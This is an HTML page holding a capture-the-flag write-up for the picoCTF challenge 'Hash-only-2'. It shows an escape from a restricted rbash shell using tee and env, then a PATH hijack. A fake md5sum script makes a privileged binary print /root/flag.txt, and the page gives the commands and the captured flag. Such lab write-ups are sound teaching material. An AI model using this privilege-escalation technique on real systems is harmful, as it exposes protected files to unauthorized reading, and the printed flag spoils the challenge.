@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hash-only-2 - Writeup</title>
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;500;700&family=Space+Mono:ital,wght@0,400;0,700;1,400&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <style>
+        /* --- Global Variables (Same as your Main Site) --- */
+        :root {
+            --bg-color: #f4f4f5;
+            --text-main: #18181b;
+            --text-muted: #52525b;
+            --accent-color: #0d9488;
+            --code-bg: #27272a;
+            --code-text: #4ade80; /* Hacker Green */
+            --font-main: 'Outfit', sans-serif;
+            --font-code: 'Space Mono', monospace;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            background-color: var(--bg-color);
+            background-image: radial-gradient(#d4d4d8 1px, transparent 1px);
+            background-size: 24px 24px;
+            color: var(--text-main);
+            font-family: var(--font-main);
+            padding: 40px 20px;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        /* --- Header --- */
+        header {
+            margin-bottom: 40px;
+            border-bottom: 2px solid var(--text-main);
+            padding-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        h1 {
+            font-family: var(--font-code);
+            font-size: 1.5rem;
+            text-transform: uppercase;
+            font-weight: 700;
+        }
+
+        .back-btn {
+            text-decoration: none;
+            color: var(--text-main);
+            font-family: var(--font-code);
+            font-weight: 700;
+            border: 1px solid var(--text-main);
+            padding: 8px 16px;
+            border-radius: 4px;
+            transition: all 0.3s;
+            font-size: 0.8rem;
+        }
+
+        .back-btn:hover {
+            background-color: var(--text-main);
+            color: #fff;
+        }
+
+        /* --- Content Styling --- */
+        .content {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            border: 1px solid #e4e4e7;
+            box-shadow: 4px 4px 0px rgba(0,0,0,0.05);
+        }
+
+        h2 {
+            font-family: var(--font-code);
+            color: var(--accent-color);
+            margin-top: 30px;
+            margin-bottom: 15px;
+            font-size: 1.2rem;
+        }
+
+        h3 {
+            font-family: var(--font-main);
+            color: var(--text-main);
+            font-weight: 700;
+            margin-top: 25px;
+            margin-bottom: 10px;
+            font-size: 1.1rem;
+        }
+
+        p {
+            line-height: 1.8;
+            margin-bottom: 20px;
+            color: var(--text-main);
+        }
+
+        /* Styling the Code Blocks */
+        .code-block {
+            background-color: var(--code-bg);
+            color: var(--code-text);
+            font-family: var(--font-code);
+            padding: 15px;
+            border-radius: 6px;
+            overflow-x: auto; /* Allows scrolling if text is too long */
+            margin-bottom: 20px;
+            font-size: 0.9rem;
+            border-left: 4px solid var(--accent-color);
+        }
+
+        /* Styling the "Given Challenge" Quote */
+        blockquote {
+            background-color: #f0fdfa; /* Light Teal */
+            border-left: 4px solid var(--accent-color);
+            padding: 15px;
+            margin-bottom: 25px;
+            font-style: italic;
+            color: var(--text-muted);
+        }
+
+        /* The Flag Styling */
+        .flag {
+            background-color: var(--accent-color);
+            color: white;
+            padding: 5px 10px;
+            border-radius: 4px;
+            font-family: var(--font-code);
+            font-weight: 700;
+        }
+
+    </style>
+</head>
+<body>
+
+    <header>
+        <h1>Hash-only-2 Writeup</h1>
+        <a href="../../writeups.html" class="back-btn">Back to List</a>
+    </header>
+
+    <div class="content">
+        
+        <h2>// Given Challenge</h2>
+        <blockquote>
+            Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. If only it could just give you the actual content!
+        </blockquote>
+
+        <p>First, connect to the challenge by launching the instance and connecting through SSH:</p>
+
+        <div class="code-block">
+ssh username@ipaddress -p port_number
+        </div>
+
+        <p>After logging in, I casually entered the <code>ls</code> command to see the contents and found nothing. Then, I checked my current location with <code>pwd</code> and saw I was in <code>/home/ctf-player</code>.</p>
+        
+        <p>In the description, it was suggested to run the binary. I typed <code>flaghasher</code> in the command line:</p>
+
+        <div class="code-block">
+Computing the MD5 hash of /root/flag.txt....
+ecbb7393ae1660f00340b6194d5bf6a6  /root/flag.txt
+        </div>
+
+        <p>From this output, we can understand that the flag is located at <code>/root/flag.txt</code>. However, this is a binary exploitation challenge, so we don't need to crack the hash. Instead, this challenge relies on a <strong>Path Hijacking Vulnerability</strong>.</p>
+
+        <h2>// Path Hijacking Analysis</h2>
+        <h3>What is PATH hijacking?</h3>
+        <p>When a program runs a command like <code>md5sum</code>, the system searches for the <code>md5sum</code> executable by looking through the directories listed in the <code>PATH</code> environment variable. If we place a fake <code>md5sum</code> script earlier in the <code>PATH</code> sequence, the system will execute our script instead of the real one.</p>
+
+        <p>Since we are in a restricted shell (rbash), direct redirection using <code>&gt;</code> is blocked:</p>
+
+        <div class="code-block">
+echo '...' > md5sum  
+rbash: restricted: cannot redirect output
+        </div>
+
+        <p>To bypass this, we can use the <code>tee</code> command, which allows writing to files without shell redirection.</p>
+
+        <h2>// Exploitation</h2>
+        <p>We will create a fake <code>md5sum</code> script using <code>printf</code> and <code>tee</code>:</p>
+
+        <div class="code-block">
+printf '#!/bin/sh\ncat /root/flag.txt\n' | tee md5sum
+        </div>
+
+        <h3>Explanation of the command:</h3>
+        <ul>
+            <li><code>#!/bin/sh</code> (Shebang): Tells the OS this file is a script to be executed using the shell.</li>
+            <li><code>cat /root/flag.txt</code>: The payload that reads the flag content.</li>
+            <li><code>|</code> (Pipe): Takes the output from printf and sends it as input to the next command.</li>
+            <li><code>tee</code>: Reads the input and writes it to both the screen and the file named <code>md5sum</code>.</li>
+        </ul>
+
+        <p>Next, we must make our new script executable:</p>
+
+        <div class="code-block">
+chmod +x md5sum
+        </div>
+
+        <p>Trying to modify the PATH variable directly failed because it is read-only in this restricted shell:</p>
+
+        <div class="code-block">
+PATH=.:$PATH flaghasher  
+rbash: PATH: readonly variable
+        </div>
+
+        <p>However, we can use the <code>env</code> command to launch a program with a modified environment, effectively bypassing the rbash restriction:</p>
+
+        <div class="code-block">
+env PATH=.:$PATH flaghasher
+        </div>
+
+        <h2>// The Result</h2>
+        <p>Running the final command executes our fake <code>md5sum</code> instead of the system's hashing tool:</p>
+
+        <div class="code-block">
+ctf-player@pico-chall$ env PATH=.:$PATH flaghasher
+Computing the MD5 hash of /root/flag.txt....   
+picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_364b3672}
+        </div>
+
+        <p>The final flag is: <br><br> <span class="flag">picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_364b3672}</span></p>
+
+    </div>
+
+</body>
+</html>
